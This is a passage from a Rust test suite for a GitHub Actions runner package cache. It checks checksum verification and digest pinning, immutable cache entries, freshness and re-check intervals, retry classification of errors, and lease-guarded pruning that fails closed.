            Some(FailureReason::RunnerPackageUnverified)
        );
        let action = error.operator_action().expect("a terminal error acts");
        assert!(
            action.contains("pin"),
            "the remedy must name pinning, got `{action}`"
        );
        assert!(
            error.to_string().contains("Pin the digest"),
            "the message must name the remedy: `{error}`"
        );
        assert_eq!(
            harness.fetcher.count(),
            0,
            "an unverifiable package must not be downloaded at all"
        );
    }

    #[tokio::test]
    async fn an_empty_published_checksum_is_reported_as_empty_rather_than_absent() {
        // `c3` keeps absent and empty apart deliberately; both are unusable,
        // but they are different facts about GitHub's response and the operator
        // is owed the one that happened.
        let payload = tar_gz_bytes(&package_entries());
        let harness = Harness::new(
            vec![published("linux", "x64", "2.330.0", ".tar.gz", Some(""))],
            payload,
        );

        let error = harness.cache().ensure_installed().await.unwrap_err();

        assert!(
            matches!(
                error,
                PackageError::ChecksumAbsent {
                    published: PublishedChecksum::Empty,
                    ..
                }
            ),
            "expected an empty checksum, got {error:?}"
        );
        assert!(error.to_string().contains("an empty sha256_checksum"));
    }

    #[tokio::test]
    async fn an_operator_pinned_digest_installs_what_github_published_no_checksum_for() {
        let payload = tar_gz_bytes(&package_entries());
        let digest = hex_digest(&payload);
        let harness = Harness::new(
            vec![published("linux", "x64", "2.330.0", ".tar.gz", None)],
            payload,
        );
        let cache = harness.cache().with_pins(
            PinnedDigests::new()
                .pin("2.330.0", &digest)
                .expect("a well-formed pin"),
        );

        let installed = cache.ensure_installed().await.expect("a pinned install");

        assert_eq!(installed.version(), &version("2.330.0"));
        assert_eq!(installed.digest().as_str(), digest);
        assert!(installed.root().join("run.sh").is_file());
    }

    #[tokio::test]
    async fn a_pinned_digest_is_a_digest_to_check_not_a_check_to_skip() {
        // The failure this asserts against is the obvious misreading of
        // "require an operator-pinned digest": treating the presence of a pin
        // as permission to install whatever arrives.
        let payload = tar_gz_bytes(&package_entries());
        let harness = Harness::new(
            vec![published("linux", "x64", "2.330.0", ".tar.gz", None)],
            payload,
        );
        let cache = harness.cache().with_retry_budget(1).with_pins(
            PinnedDigests::new()
                .pin("2.330.0", &"a".repeat(64))
                .unwrap(),
        );

        let error = cache.ensure_installed().await.unwrap_err();

        let inner = match &error {
            PackageError::Exhausted { source, .. } => source.as_ref(),
            other => other,
        };
        assert!(
            matches!(inner, PackageError::ChecksumMismatch { .. }),
            "a wrong pin must still refuse, got {error:?}"
        );
        assert!(cache.installed().unwrap().is_empty());
    }

    #[tokio::test]
    async fn a_pin_for_a_different_version_does_not_unlock_this_one() {
        let payload = tar_gz_bytes(&package_entries());
        let digest = hex_digest(&payload);
        let harness = Harness::new(
            vec![published("linux", "x64", "2.330.0", ".tar.gz", None)],
            payload,
        );
        // The operator confirmed 2.320.0, not 2.330.0.
        let cache = harness
            .cache()
            .with_pins(PinnedDigests::new().pin("2.320.0", &digest).unwrap());

        let error = cache.ensure_installed().await.unwrap_err();

        assert!(matches!(error, PackageError::ChecksumAbsent { .. }));
        assert_eq!(harness.fetcher.count(), 0);
    }

    #[tokio::test]
    async fn a_malformed_published_checksum_refuses_and_says_it_was_malformed() {
        // The third unusable shape, and the one that used to name a remedy the
        // operator could not carry out: it returned `MalformedDigest` from a
        // path where the pin was never consulted, while telling them to pin.
        let payload = tar_gz_bytes(&package_entries());
        for bad in ["sha256:9f86d081884c7d65", &"a".repeat(63), "not a digest"] {
            let harness = Harness::new(
                vec![published("linux", "x64", "2.330.0", ".tar.gz", Some(bad))],
                payload.clone(),
            );

            let error = harness.cache().ensure_installed().await.unwrap_err();

            assert!(
                matches!(
                    error,
                    PackageError::ChecksumAbsent {
                        published: PublishedChecksum::Malformed,
                        ..
                    }
                ),
                "`{bad}` should be reported as malformed, got {error:?}"
            );
            assert!(error.is_terminal());
            assert_eq!(
                error.failure_reason(),
                Some(FailureReason::RunnerPackageUnverified)
            );
            assert!(
                error.to_string().contains("a malformed sha256_checksum"),
                "the operator is owed the shape that actually arrived: `{error}`"
            );
            assert_eq!(harness.fetcher.count(), 0);
        }
    }

    #[tokio::test]
    async fn a_malformed_published_checksum_is_rescued_by_an_operator_pin() {
        // The remedy the refusal names has to be one that works. Every unusable
        // shape — absent, empty, malformed — routes to the pin.
        let payload = tar_gz_bytes(&package_entries());
        let digest = hex_digest(&payload);
        let harness = Harness::new(
            vec![published(
                "linux",
                "x64",
                "2.330.0",
                ".tar.gz",
                Some("sha256:9f86d081884c7d65"),
            )],
            payload,
        );
        let cache = harness
            .cache()
            .with_pins(PinnedDigests::new().pin("2.330.0", &digest).unwrap());

        let installed = cache
            .ensure_installed()
            .await
            .expect("a pin rescues a malformed published checksum");

        assert_eq!(installed.digest().as_str(), digest);
        assert!(installed.root().join("run.sh").is_file());
    }

    #[tokio::test]
    async fn every_unusable_published_checksum_shape_names_the_same_workable_remedy() {
        let payload = tar_gz_bytes(&package_entries());
        let digest = hex_digest(&payload);
        for (raw, expected) in [
            (None, PublishedChecksum::Absent),
            (Some(""), PublishedChecksum::Empty),
            (Some("nonsense"), PublishedChecksum::Malformed),
        ] {
            let downloads = vec![published("linux", "x64", "2.330.0", ".tar.gz", raw)];

            // Without a pin: refused, and the message names pinning.
            let harness = Harness::new(downloads.clone(), payload.clone());
            let error = harness.cache().ensure_installed().await.unwrap_err();
            assert!(
                matches!(
                    &error,
                    PackageError::ChecksumAbsent { published, .. } if *published == expected
                ),
                "{expected:?}: got {error:?}"
            );
            assert!(error.operator_action().unwrap().contains("pin"));

            // With a pin: installed. This is the assertion that makes the
            // remedy true rather than merely stated.
            let harness = Harness::new(downloads, payload.clone());
            let cache = harness
                .cache()
                .with_pins(PinnedDigests::new().pin("2.330.0", &digest).unwrap());
            cache
                .ensure_installed()
                .await
                .unwrap_or_else(|error| panic!("{expected:?} should be pinnable: {error}"));
        }
    }

    // =====================================================================
    // DoD 4 — a cache entry is never mutated after extraction, and a second
    // install of the same version is a no-op.
    // =====================================================================

    #[tokio::test]
    async fn a_second_install_of_the_same_version_rewrites_nothing() {
        let (harness, _, _) = linux_fixture();
        let cache = harness.cache();

        let first = cache.ensure_installed().await.expect("the first install");
        assert_eq!(harness.fetcher.count(), 1);
        assert_eq!(harness.catalog.calls(), 1);

        // Past the freshness window, with the SAME version still published.
        //
        // Advancing only past `check_interval` is not enough, and measuring
        // that is what fixed this test: the entry then still sits inside the
        // freshness window, so deleting the already-installed short-circuit
        // changed nothing — the freshness branch returned the same cached entry
        // and the test stayed green through a mutation that should have killed
        // it. Past the window that branch no longer covers, and the entry
        // short-circuit is the only thing between this call and a re-download.
        harness
            .clock
            .advance(Elapsed::days(FRESHNESS_WINDOW_DAYS + 1));

        let second = cache.ensure_installed().await.expect("the second install");

        assert_eq!(second.version(), first.version());
        assert_eq!(second.root(), first.root());
        assert_eq!(
            harness.catalog.calls(),
            2,
            "the published version should have been re-checked"
        );
        // THIS is the assertion that proves the no-op, and it is the only one
        // here that can distinguish a no-op from a re-install.
        //
        // An earlier version of this test also planted a marker file inside the
        // entry and compared a `(len, mtime, digest)` snapshot before and
        // after, and presented all three as proof. Two of the three could not
        // fail. The commit point is a single `fs::rename` onto the version
        // directory, which cannot replace a non-empty directory on any platform
        // this product targets — so even with the short-circuit deleted, the
        // rename fails, `entry()` answers `Some`, and the existing entry is
        // returned untouched. The marker survives and the snapshot matches for
        // a reason that has nothing to do with the branch under test. Three
        // legs that read as triple-proof and were single-proof is worse than
        // one honest leg, so the other two are gone.
        //
        // The immutability property they were reaching for is real and is
        // pinned separately, by `the_commit_rename_never_replaces_an_existing_
        // entry` below, which asserts the platform behaviour this design rests
        // on and *can* fail if it ever stops holding.
        assert_eq!(
            harness.fetcher.count(),
            1,
            "a version already held must not be downloaded again"
        );
    }

    #[test]
    fn the_commit_rename_never_replaces_an_existing_entry() {
        // The assumption the whole immutability claim rests on, asserted
        // directly instead of being inferred from an install that would not
        // have exercised it.
        //
        // `download_verify_and_install` commits by renaming a staging directory
        // onto `packages/<version>/`. If that rename could clobber a populated
        // directory, an entry would be mutable after it landed and every
        // runtime copied from it could change underfoot. It cannot — and this
        // is where that stops being a comment.
        let dir = tempfile::tempdir().expect("a temporary root");
        let existing = dir.path().join("2.330.0");
        fs::create_dir_all(existing.join("bin")).unwrap();
        fs::write(existing.join("run.sh"), b"the original").unwrap();
        let replacement = dir.path().join("staging");
        fs::create_dir_all(&replacement).unwrap();
        fs::write(replacement.join("run.sh"), b"the replacement").unwrap();

        let result = fs::rename(&replacement, &existing);

        assert!(
            result.is_err(),
            "renaming onto a populated entry must fail, or entries are mutable"
        );
        assert_eq!(
            fs::read_to_string(existing.join("run.sh")).unwrap(),
            "the original",
            "the existing entry's contents must survive"
        );
        assert!(
            existing.join("bin").is_dir(),
            "the existing entry's structure must survive"
        );
    }

    #[tokio::test]
    async fn a_stale_entry_that_is_still_the_published_version_is_reused() {
        // Past the freshness deadline, but GitHub has published nothing newer.
        // There is no fresher package to fetch, so re-downloading identical
        // bytes would cost 150-300 MB and change nothing.
        //
        // **This exits at the `entry(&version)` short-circuit, not at the
        // freshness branch** — the published version and the cached one are the
        // same, so the entry is found before staleness is ever consulted. An
        // earlier comment here claimed the freshness branch, which was wrong:
        // that branch is the one where the published version *differs* and the
        // cache is still inside the window, and it is pinned by
        // `a_cached_version_inside_the_window_is_not_re_downloaded`.
        //
        // What this test adds over the no-op test is the *staleness* of the
        // entry: it asserts that being past the deadline does not by itself
        // force a download when there is nothing newer to download.
        let (harness, _, _) = linux_fixture();
        let cache = harness.cache();
        let first = cache.ensure_installed().await.expect("an install");
        harness
            .clock
            .advance(Elapsed::days(FRESHNESS_WINDOW_DAYS + 1));

        let again = cache.ensure_installed().await.expect("the same entry");

        assert!(
            cache.is_stale(&first, harness.clock.now()),
            "the entry really is past the deadline"
        );
        assert_eq!(again.version(), first.version());
        assert_eq!(harness.fetcher.count(), 1);
        assert_eq!(cache.installed().unwrap().len(), 1);
    }

    #[tokio::test]
    async fn an_entry_is_complete_the_moment_it_exists() {
        // The manifest lands inside the staging directory and arrives with the
        // entry in one rename, so there is no window in which a directory
        // exists without it. A directory with no manifest is therefore not an
        // entry, and is not returned as one.
        let (harness, _, _) = linux_fixture();
        let cache = harness.cache();
        let installed = cache.ensure_installed().await.expect("an install");
        assert!(installed.root().join(MANIFEST_FILE).is_file());

        // A directory that this module did not produce.
        let impostor = cache.root().join("9.9.9");
        fs::create_dir_all(impostor.join("bin")).unwrap();
        fs::write(impostor.join("run.sh"), b"not ours").unwrap();

        assert!(cache.entry(&version("9.9.9")).unwrap().is_none());
        assert_eq!(
            cache.installed().unwrap().len(),
            1,
            "only the real entry counts as installed"
        );
    }

    #[tokio::test]
    async fn a_download_that_fails_leaves_no_entry_and_no_file() {
        let (harness, _, _) = linux_fixture();
        *harness.fetcher.fail.lock().unwrap() = true;
        let cache = harness.cache().with_retry_budget(1);

        assert!(cache.ensure_installed().await.is_err());

        assert!(cache.installed().unwrap().is_empty());
        let leftovers = all_paths(cache.root());
        assert_eq!(
            leftovers,
            vec![".staging".to_string()],
            "a failed download leaves an empty staging directory and nothing else"
        );
    }

    #[tokio::test]
    async fn a_verified_package_that_will_not_extract_still_leaves_nothing_behind() {
        // The interesting interruption: the bytes are exactly what GitHub
        // published — the digest matches — and extraction fails anyway. The
        // downloaded file exists at that point, so this is the path where a
        // missing cleanup would actually leak a 150-300 MB file.
        let payload = b"this verifies but is not a gzip stream".to_vec();
        let harness = Harness::new(
            vec![published(
                "linux",
                "x64",
                "2.330.0",
                ".tar.gz",
                Some(&hex_digest(&payload)),
            )],
            payload,
        );
        let cache = harness.cache().with_retry_budget(1);

        let error = cache.ensure_installed().await.unwrap_err();
        let inner = match &error {
            PackageError::Exhausted { source, .. } => source.as_ref(),
            other => other,
        };
        assert!(
            matches!(inner, PackageError::Extract { .. }),
            "expected an extraction failure, got {error:?}"
        );

        let wrote = harness.fetcher.wrote();
        assert_eq!(wrote.len(), 1, "the download did happen");
        assert!(
            !wrote[0].exists(),
            "the verified-but-unusable download at {:?} must still be removed",
            wrote[0]
        );
        assert!(cache.installed().unwrap().is_empty());

        // Whatever the half-extraction left is staging litter, and the sweep
        // clears it.
        let before = all_paths(cache.root());
        assert!(
            before.iter().all(|path| path.starts_with(".staging")),
            "only staging litter may survive; found {before:?}"
        );
        cache.sweep_staging().expect("a sweep");
        assert_eq!(
            all_paths(cache.root()),
            vec![".staging".to_string()],
            "the sweep empties staging, leaving only the directory itself"
        );
    }

    // =====================================================================
    // DoD 5 — freshness, and the version rejection that must not retry.
    // =====================================================================

    #[tokio::test]
    async fn a_cached_version_more_than_thirty_days_behind_is_refreshed_before_a_cold_start() {
        let (harness, _, _) = linux_fixture();
        let cache = harness.cache();
        let first = cache.ensure_installed().await.expect("the first install");
        assert_eq!(first.version(), &version("2.330.0"));

        // A new release, and the cached entry is now past the deadline.
        let newer = tar_gz_bytes(&[("run.sh", "#!/bin/sh\necho newer\n")]);
        harness.catalog.publish(vec![published(
            "linux",
            "x64",
            "2.340.0",
            ".tar.gz",
            Some(&hex_digest(&newer)),
        )]);
        harness.fetcher.serve(newer);
        harness
            .clock
            .advance(Elapsed::days(FRESHNESS_WINDOW_DAYS + 1));

        let second = cache.ensure_installed().await.expect("a refresh");

        assert_eq!(second.version(), &version("2.340.0"));
        assert_eq!(harness.fetcher.count(), 2, "the newer package was fetched");
        assert_eq!(
            cache.installed().unwrap().len(),
            2,
            "the old entry is not removed by a refresh; pruning is a separate, \
             guarded decision"
        );
    }

    #[tokio::test]
    async fn a_cached_version_inside_the_window_is_not_re_downloaded() {
        // The other half of the rule, and the one that keeps a 150-300 MB
        // download from following every point release.
        let (harness, _, _) = linux_fixture();
        let cache = harness.cache();
        cache.ensure_installed().await.expect("the first install");

        let newer = tar_gz_bytes(&[("run.sh", "newer\n")]);
        harness.catalog.publish(vec![published(
            "linux",
            "x64",
            "2.340.0",
            ".tar.gz",
            Some(&hex_digest(&newer)),
        )]);
        harness.fetcher.serve(newer);
        harness
            .clock
            .advance(Elapsed::days(FRESHNESS_WINDOW_DAYS - 1));

        let second = cache.ensure_installed().await.expect("the cached entry");

        assert_eq!(second.version(), &version("2.330.0"));
        assert_eq!(harness.fetcher.count(), 1, "nothing new was downloaded");
    }

    #[tokio::test]
    async fn the_freshness_boundary_is_the_documented_thirty_days() {
        let (harness, _, _) = linux_fixture();
        let cache = harness.cache();
        let installed = cache.ensure_installed().await.expect("an install");
        let installed_at = installed.installed_at();

        assert!(!cache.is_stale(&installed, installed_at));
        assert!(!cache.is_stale(
            &installed,
            installed_at + Elapsed::days(FRESHNESS_WINDOW_DAYS)
        ));
        assert!(cache.is_stale(
            &installed,
            installed_at + Elapsed::days(FRESHNESS_WINDOW_DAYS) + Elapsed::seconds(1)
        ));
    }

    #[tokio::test]
    async fn the_published_version_is_re_checked_only_on_a_bounded_interval() {
        let (harness, _, _) = linux_fixture();
        let cache = harness.cache();
        cache.ensure_installed().await.expect("the first install");
        assert_eq!(harness.catalog.calls(), 1);

        // Inside the interval: no REST call at all.
        harness
            .clock
            .advance(Elapsed::hours(CHECK_INTERVAL_HOURS - 1));
        cache.ensure_installed().await.expect("a cached answer");
        assert_eq!(
            harness.catalog.calls(),
            1,
            "a cold start inside the interval must not re-check"
        );

        // Past it: one more.
        harness.clock.advance(Elapsed::hours(2));
        cache.ensure_installed().await.expect("a re-check");
        assert_eq!(harness.catalog.calls(), 2);
    }

    #[tokio::test]
    async fn a_stale_entry_forces_a_re_check_even_inside_the_interval() {
        // The interval saves REST budget; there is no budget worth saving once
        // the package on disk is one GitHub may refuse.
        let (harness, _, _) = linux_fixture();
        let cache = harness.cache();
        cache.ensure_installed().await.expect("an install");
        assert_eq!(harness.catalog.calls(), 1);

        harness
            .clock
            .advance(Elapsed::days(FRESHNESS_WINDOW_DAYS + 1));
        // The last check is now 31 days old, so it is due anyway; wind it
        // forward by re-checking, then step only a minute.
        cache.ensure_installed().await.expect("a re-check");
        let after_recheck = harness.catalog.calls();
        harness.clock.advance(Elapsed::minutes(1));

        cache.ensure_installed().await.expect("another cold start");

        assert_eq!(
            harness.catalog.calls(),
            after_recheck + 1,
            "a stale entry must be re-checked on every cold start, interval or not"
        );
    }

    #[tokio::test]
    async fn a_version_rejection_is_terminal_and_produces_no_retry() {
        let (harness, _, _) = linux_fixture();
        let harness = harness.with_catalog(FakeCatalog::answering(Answer::Rejected));
        // A budget of three, deliberately: if the rejection were treated as
        // retryable, the counter below would read three.
        let cache = harness.cache().with_retry_budget(3);

        let error = cache.ensure_installed().await.unwrap_err();

        assert!(
            matches!(error, PackageError::VersionRejected { .. }),
            "expected a version rejection, got {error:?}"
        );
        assert!(error.is_terminal());
        assert_eq!(
            error.failure_reason(),
            Some(FailureReason::RunnerVersionRejected),
            "the domain already names this; no second vocabulary"
        );
        assert!(
            error.operator_action().is_some(),
            "a terminal condition owes the operator an action"
        );
        assert!(
            error.to_string().contains("cannot succeed"),
            "the message must say retrying is pointless: `{error}`"
        );
        assert_eq!(
            harness.catalog.calls(),
            1,
            "a version rejection must be attempted exactly once"
        );
        assert_eq!(harness.fetcher.count(), 0);
    }

    #[tokio::test]
    async fn a_retryable_catalog_failure_does_spend_the_whole_budget() {
        // The contrast that gives the assertion above its meaning: with the
        // same budget and the same code path, a retryable answer is retried
        // three times. Without this, "calls == 1" could just mean the retry
        // loop never worked at all.
        let (harness, _, _) = linux_fixture();
        let harness = harness.with_catalog(FakeCatalog::answering(Answer::Unavailable));
        let cache = harness.cache().with_retry_budget(3);

        let error = cache.ensure_installed().await.unwrap_err();

        assert!(matches!(error, PackageError::Exhausted { attempts: 3, .. }));
        assert_eq!(
            harness.catalog.calls(),
            3,
            "a retryable failure must spend the budget"
        );
        assert!(
            error.operator_action().is_none(),
            "the answer to a transient failure is to wait, not to act"
        );
    }

    /// One `PackageError` variant's name, by an **exhaustive** match.
    ///
    /// This is the mechanism that keeps the classification table below honest.
    /// Two hand-written sample lists preceded it, and between them they omitted
    /// `Io` and `Exhausted` entirely — a new variant joined neither list and
    /// nothing complained. Adding a variant now stops this function compiling,
    /// which puts the author in front of the table, and the coverage assertion
    /// in `every_variant_is_classified_and_classification_matches_the_remedy`
    /// then fails until a sample joins it.
    fn variant_name(error: &PackageError) -> &'static str {
        match error {
            PackageError::UnsupportedHost(_) => "UnsupportedHost",
            PackageError::NoPackagePublished { .. } => "NoPackagePublished",
            PackageError::ChecksumAbsent { .. } => "ChecksumAbsent",
            PackageError::ChecksumMismatch { .. } => "ChecksumMismatch",
            PackageError::MalformedDigest { .. } => "MalformedDigest",
            PackageError::VersionRejected { .. } => "VersionRejected",
            PackageError::CatalogUnavailable { .. } => "CatalogUnavailable",
            PackageError::Download { .. } => "Download",
            PackageError::UnrecognisedVersion { .. } => "UnrecognisedVersion",
            PackageError::UnsupportedArchive { .. } => "UnsupportedArchive",
            PackageError::UnsafeArchiveEntry { .. } => "UnsafeArchiveEntry",
            PackageError::Extract { .. } => "Extract",
            PackageError::VersionInUse { .. } => "VersionInUse",
            PackageError::VersionHeldByUnknownAttempt { .. } => "VersionHeldByUnknownAttempt",
            PackageError::UnreadableLease { .. } => "UnreadableLease",
            PackageError::WorkspaceInsideCache { .. } => "WorkspaceInsideCache",
            PackageError::NotInstalled { .. } => "NotInstalled",
            PackageError::Io { .. } => "Io",
            PackageError::Exhausted { .. } => "Exhausted",
        }
    }

    /// How many variants `variant_name` covers.
    ///
    /// Bumped by hand, and the assertion that uses it is what makes forgetting
    /// impossible to do quietly: a new variant that reaches `variant_name` but
    /// not the sample table fails the coverage check, and bumping this without
    /// adding a sample fails it too.
    const PACKAGE_ERROR_VARIANTS: usize = 19;

    #[test]
    fn every_variant_is_classified_and_classification_matches_the_remedy() {
        // One table, every variant, each declaring what it should be. The two
        // separate lists this replaced could not express "these are all of
        // them", which is how `Io` and `Exhausted` went untested.
        let samples: Vec<(PackageError, bool)> = vec![
            (
                PackageError::Io {
                    what: "read",
                    path: PathBuf::from("x"),
                    source: io::Error::other("disk"),
                },
                false,
            ),
            (
                PackageError::Exhausted {
                    attempts: 3,
                    source: Box::new(PackageError::Download {
                        detail: "reset".to_string(),
                    }),
                },
                true,
            ),
            (
                PackageError::UnreadableLease {
                    path: PathBuf::from("x.lease"),
                },
                true,
            ),
            (
                PackageError::ChecksumMismatch {
                    version: version("2.330.0"),
                    expected: Sha256Hex::parse(&"a".repeat(64)).unwrap(),
                    actual: Sha256Hex::parse(&"b".repeat(64)).unwrap(),
                },
                false,
            ),
            (
                PackageError::CatalogUnavailable {
                    detail: "502".to_string(),
                },
                false,
            ),
            (
                PackageError::Download {
                    detail: "reset".to_string(),
                },
                false,
            ),
            (
                PackageError::Extract {
                    detail: "short read".to_string(),
                },
                false,
            ),
            (
                PackageError::UnsupportedHost(UnsupportedHost::UndocumentedPair {
                    os: Os::Windows,
                    arch: Arch::Arm32,
                }),
                true,
            ),
            (
                PackageError::NoPackagePublished {
                    os: Os::Linux,
                    arch: Arch::Arm32,
                },
                true,
            ),
            (
                PackageError::ChecksumAbsent {
                    version: version("2.330.0"),
                    os: Os::Linux,
                    arch: Arch::X64,
                    published: PublishedChecksum::Absent,
                },
                true,
            ),
            (
                PackageError::MalformedDigest {
                    raw: "nope".to_string(),
                },
                true,
            ),
            (
                PackageError::VersionRejected {
                    version: None,
                    detail: None,
                },
                true,
            ),
            (
                PackageError::UnrecognisedVersion {
                    raw: "nope".to_string(),
                },
                true,
            ),
            (
                PackageError::UnsupportedArchive {
                    filename: "x.rar".to_string(),
                },
                true,
            ),
            (
                PackageError::UnsafeArchiveEntry {
                    entry: "../x".to_string(),
                },
                true,
            ),
            (
                PackageError::VersionInUse {
                    version: version("2.330.0"),
                    attempt: fixtures::ATTEMPT_ID,
                    state: AttemptState::Busy,
                },
                true,
            ),
            (
                PackageError::VersionHeldByUnknownAttempt {
                    version: version("2.330.0"),
                    attempt: fixtures::ATTEMPT_ID,
                },
                true,
            ),
            (
                PackageError::WorkspaceInsideCache {
                    attempt: fixtures::ATTEMPT_ID,
                    path: PathBuf::from("x"),
                },
                true,
            ),
            (
                PackageError::NotInstalled {
                    version: version("2.330.0"),
                },
                true,
            ),
        ];

        let covered: std::collections::BTreeSet<&'static str> = samples
            .iter()
            .map(|(error, _)| variant_name(error))
            .collect();
        assert_eq!(
            covered.len(),
            PACKAGE_ERROR_VARIANTS,
            "every variant needs a sample; covered {covered:?}"
        );

        for (error, terminal) in samples {
            let name = variant_name(&error);
            assert_eq!(
                error.is_terminal(),
                terminal,
                "{name} is classified the wrong way"
            );
            // `03-control-flows.md` calls the terminal ones "operator-
            // actionable": every one must say what to do, and a retryable one
            // must not, because the answer there is to wait.
            //
            // `Exhausted` is the exception that proves the rule — it is
            // terminal and delegates both its action and its journal reason to
            // whatever the budget was spent on, so it has an action only when
            // that inner error does.
            if name == "Exhausted" {
                continue;
            }
            assert_eq!(
                error.operator_action().is_some(),
                terminal,
                "{name}: a terminal condition owes an action and a retryable one does not"
            );
        }
    }

    #[test]
    fn a_removed_sample_is_caught_by_the_coverage_assertion() {
        // The coverage check above is the only thing standing between a new
        // variant and going untested, so it gets its own negative control.
        let short: Vec<PackageError> = vec![PackageError::NotInstalled {
            version: version("2.330.0"),
        }];
        let covered: std::collections::BTreeSet<&'static str> =
            short.iter().map(variant_name).collect();
        assert_ne!(
            covered.len(),
            PACKAGE_ERROR_VARIANTS,
            "an incomplete sample list must not satisfy the coverage check"
        );
    }

    #[test]
    fn exhaustion_reports_the_reason_the_budget_was_spent_on() {
        let exhausted = PackageError::Exhausted {
            attempts: 3,
            source: Box::new(PackageError::ChecksumMismatch {
                version: version("2.330.0"),
                expected: Sha256Hex::parse(&"a".repeat(64)).unwrap(),
                actual: Sha256Hex::parse(&"b".repeat(64)).unwrap(),
            }),
        };
        assert!(exhausted.is_terminal(), "the budget is spent");
        assert_eq!(
            exhausted.failure_reason(),
            Some(FailureReason::RunnerPackageUnverified),
            "the journal reason comes from what actually failed"
        );
    }

    // =====================================================================
    // DoD 6 — pruning refuses a version a non-terminal attempt references,
    // and succeeds once that attempt is terminal.
    // =====================================================================

    /// An attempt in `state`, with a runtime under the runtime directory where
    /// `e3` will actually put it.
    fn attempt_in(harness: &Harness, id: u128, state: AttemptState) -> RunnerAttempt {
        let id = AttemptId::from_u128(id);
        let runtime = harness
            .paths
            .runtime_dir()
            .join(fixtures::POLICY_ID.to_string())
            .join(id.to_string());
        fixtures::attempt()
            .id(id)
            .state(state)
            .runtime_path(runtime.to_string_lossy().to_string())
            .build()
    }

    async fn cache_with_one_entry(harness: &Harness) -> PackageCache {
        let cache = harness.cache();
        cache.ensure_installed().await.expect("an install");
        cache
    }

    #[tokio::test]
    async fn pruning_refuses_a_version_a_non_terminal_attempt_references() {
        let (harness, _, _) = linux_fixture();
        let cache = cache_with_one_entry(&harness).await;
        let held = version("2.330.0");

        // Every non-terminal state, because "non-terminal" is `b1`'s definition
        // and this guard must agree with it rather than with a hand-picked
        // subset.
        for state in AttemptState::ALL.iter().filter(|s| !s.is_terminal()) {
            let attempt = attempt_in(&harness, 0x100, *state);
            cache.lease(&attempt, &held).expect("a lease");

            let error = cache
                .prune(&held, std::slice::from_ref(&attempt))
                .unwrap_err();

            assert!(
                matches!(error, PackageError::VersionInUse { .. }),
                "state `{state}` should hold the version, got {error:?}"
            );
            assert!(error.is_terminal());
            assert!(error.operator_action().is_some());
            assert!(
                cache.entry(&held).unwrap().is_some(),
                "a refused prune must leave the entry in place"
            );
            cache.release(attempt.id).expect("release");
        }
    }

    #[tokio::test]
    async fn pruning_succeeds_once_the_holding_attempt_is_terminal() {
        let (harness, _, _) = linux_fixture();
        let cache = cache_with_one_entry(&harness).await;
        let held = version("2.330.0");

        let live = attempt_in(&harness, 0x100, AttemptState::Busy);
        cache.lease(&live, &held).expect("a lease");
        assert_eq!(cache.holders(&held).unwrap(), vec![live.id]);

        // Refused while it is running...
        assert!(cache.prune(&held, std::slice::from_ref(&live)).is_err());
        let root = cache
            .entry(&held)
            .unwrap()
            .expect("still there")
            .root()
            .to_path_buf();
        assert!(root.is_dir());

        // ...and allowed the moment the same attempt is terminal.
        for state in AttemptState::ALL.iter().filter(|s| s.is_terminal()) {
            let concluded = attempt_in(&harness, 0x100, *state);
            assert!(concluded.is_terminal());
            // Re-create the entry for each terminal state so each is a real
            // prune rather than a no-op on an already-empty cache.
            if cache.entry(&held).unwrap().is_none() {
                cache.ensure_installed().await.expect("re-install");
                cache.lease(&concluded, &held).expect("a lease");
            }

            cache
                .prune(&held, std::slice::from_ref(&concluded))
                .unwrap_or_else(|error| panic!("state `{state}` should allow a prune: {error}"));

            assert!(
                cache.entry(&held).unwrap().is_none(),
                "state `{state}` should have pruned the entry"
            );
            assert!(
                cache.holders(&held).unwrap().is_empty(),
                "a spent lease is released with the entry"
            );
        }
    }

    #[tokio::test]
    async fn pruning_refuses_a_version_held_by_an_attempt_the_caller_did_not_report() {
        // `e1` documents that a launcher's newly created attempt may not be
        // visible to `attempts()` yet. Reading "absent" as "gone" would delete
        // a package out from under a starting runner, so the ambiguous case
        // fails closed.
        let (harness, _, _) = linux_fixture();
        let cache = cache_with_one_entry(&harness).await;
        let held = version("2.330.0");
        let attempt = attempt_in(&harness, 0x100, AttemptState::Starting);
        cache.lease(&attempt, &held).expect("a lease");

        let error = cache.prune(&held, &[]).unwrap_err();

        assert!(
            matches!(error, PackageError::VersionHeldByUnknownAttempt { .. }),
            "expected a fail-closed refusal, got {error:?}"
        );
        assert!(cache.entry(&held).unwrap().is_some());
        assert!(
            error
                .operator_action()
                .unwrap()
                .contains("release the lease"),
            "the refusal must name the way out, got `{}`",
            error.operator_action().unwrap()
        );

        // And the named remedy works.
        cache.release(attempt.id).expect("release");
        cache.prune(&held, &[]).expect("a released version prunes");
        assert!(cache.entry(&held).unwrap().is_none());
    }

    #[tokio::test]
    async fn a_corrupt_lease_refuses_a_prune_rather_than_vanishing() {
        // Everything else in this guard fails closed, including an attempt the
        // caller did not report. A lease file that cannot be parsed must not be
        // the one thing that fails open — "unreadable" is not "nothing holds
        // this version", and a lease is written non-atomically, so a crash
        // mid-write leaves exactly this shape.
        let (harness, _, _) = linux_fixture();
        let cache = cache_with_one_entry(&harness).await;
        let held = version("2.330.0");
        let live = attempt_in(&harness, 0x100, AttemptState::Busy);
        cache.lease(&live, &held).expect("a lease");

        // Truncate it the way an interrupted write would.
        let lease_file = cache.lease_path(live.id);
        assert!(lease_file.is_file(), "the lease must exist to be corrupted");
        fs::write(&lease_file, b"{\"version\":\"2.33").expect("corrupt the lease");

        let error = cache.prune(&held, &[]).unwrap_err();

        assert!(
            matches!(error, PackageError::UnreadableLease { .. }),
            "expected a refusal naming the unreadable lease, got {error:?}"
        );
        assert!(error.is_terminal());
        assert!(error.operator_action().is_some());
        assert!(
            cache.entry(&held).unwrap().is_some(),
            "the package a live runner may be executing from must still be there"
        );
        // `holders` refuses for the same reason rather than answering "none".
        assert!(cache.holders(&held).is_err());

        // And the named remedy works.
        fs::remove_file(&lease_file).unwrap();
        cache
            .prune(&held, &[])
            .expect("a resolved lease lets it proceed");
    }

    #[tokio::test]
    async fn a_lease_file_that_is_not_named_after_an_attempt_refuses_a_prune() {
        let (harness, _, _) = linux_fixture();
        let cache = cache_with_one_entry(&harness).await;
        let held = version("2.330.0");
        let strays = cache.root().join(LEASES_DIR);
        fs::create_dir_all(&strays).unwrap();
        let stray = strays.join(format!("not-a-uuid.{LEASE_EXTENSION}"));
        fs::write(&stray, b"{\"version\":\"2.330.0\"}").unwrap();

        let error = cache.prune(&held, &[]).unwrap_err();

        assert!(
            matches!(error, PackageError::UnreadableLease { .. }),
            "a lease whose holder cannot be identified must refuse, got {error:?}"
        );
